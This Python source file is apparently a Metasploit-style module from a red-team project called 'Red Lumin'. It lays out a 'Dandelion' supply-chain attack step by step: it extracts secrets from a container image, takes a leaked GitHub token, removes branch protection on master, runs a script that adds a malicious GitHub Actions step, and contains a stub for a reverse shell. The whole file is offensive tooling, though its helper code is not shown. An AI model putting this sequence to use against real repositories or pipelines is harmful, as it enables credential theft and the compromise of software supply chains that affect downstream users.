"""
Module for handling attack logic in the Metasploit Red Lumin project.
"""
import os
from metasploit import module
from red_lumin.utils.secrets import get_secrets_from_image, inject_secrets_into_env
from red_lumin.utils.github import check_token_permissions, remove_branch_protection
from red_lumin.utils.scripts import run_script
from time import sleep

ROOT_DIR = os.path.dirname(os.path.abspath(__file__))

class DandelionAttack:
	"""
	Class to encapsulate the Dandelion attack logic.
	"""

	github_token: str = ""
	github_repo: str = "dandelion-python"
	github_org: str = "dandelion-python"
	run_interval: int = os.getenv("RUN_INTERVAL", 10)

	def __init__(self, target: str):
		self.target = target

	def get_secrets(self) -> None:
		"""
		Extract secrets from the specified Docker image.

		Returns:
			list[dict]: A list of dictionaries containing extracted secrets.
		"""
		secrets = get_secrets_from_image("ghcr.io/dandelion-python/dandelion-python-beta:beta")
		if secrets:
			module.log(f"Extracted {len(secrets)} secrets from the image.", 'info')
			inject_secrets_into_env(secrets, GITHUB_USERNAME="tembleking", GITHUB_REPO="dandelion-python", GITHUB_ORGANIZATION="dandelion-python")
			github_token = os.getenv("GITHUB_LEAKED_TOKEN")
			if github_token:
				module.log("GitHub token found in extracted secrets.", 'info')
				self.github_token = github_token
			else:
				module.log("No GitHub token found in extracted secrets.", 'error')
				raise ValueError("GitHub token not found in extracted secrets.")
		else:
			module.log("No secrets found in the image.", 'error')
			raise ValueError("No secrets extracted from the image.")

	def alter_pipeline(self) -> None:
		"""
		Alter the GitHub Actions pipeline to introduce a malicious step.
		"""

		if not self.github_token:
			module.log("GitHub token is not set. Cannot alter pipeline.", 'error')
			raise ValueError("GitHub token is not set.")

		permissions = check_token_permissions(self.github_token)
		if permissions:
			module.log(f"Checking GitHub token permissions ...", 'info')
			if permissions.get("token") and permissions.get("scopes"):
				if "repo" in permissions["scopes"]:
					module.log("Token has repo scope.", 'info')
				else:
					module.log("Token does not have repo scope.", 'error')
					raise ValueError("Token does not have sufficient permissions.")
			else:
				module.log("Invalid token permissions structure.", 'error')
		else:
			module.log("Failed to retrieve token permissions.", 'error')
			raise ValueError("Failed to retrieve token permissions.")

		remove_branch_protection(self.github_org, self.github_repo, "master", self.github_token)

	def introduce_malicious_step(self) -> None:
		"""
		Introduce a malicious step into the GitHub Actions pipeline.
		"""
		# Placeholder for actual implementation
		module.log("Introducing malicious step into the pipeline...", 'info')
		run_script(f"{ROOT_DIR}/scripts/supply_chain_attack.sh")

	def set_reverse_shell(self) -> None:
		"""
		Set up a reverse shell to the attacker's machine.
		"""
		print("Setting up reverse shell...")
		pass

	def run(self) -> None:
		"""
		Run the complete Dandelion attack sequence.
		"""
		try:
			self.get_secrets()
			sleep(self.run_interval)
			self.alter_pipeline()
			sleep(self.run_interval)
			self.introduce_malicious_step()
			sleep(self.run_interval)
			self.set_reverse_shell()
			module.log("Dandelion attack completed successfully.", 'info')
		except ValueError as e:
			module.log(f"Dandelion attack failed: {e}", 'error')


def run_dandelion_attack(target: str) -> None:
	"""
	Run the Dandelion attack on the specified target.

	Args:
		target (str): The target to attack.
	"""
	dandelion = DandelionAttack(target)
	dandelion.run()
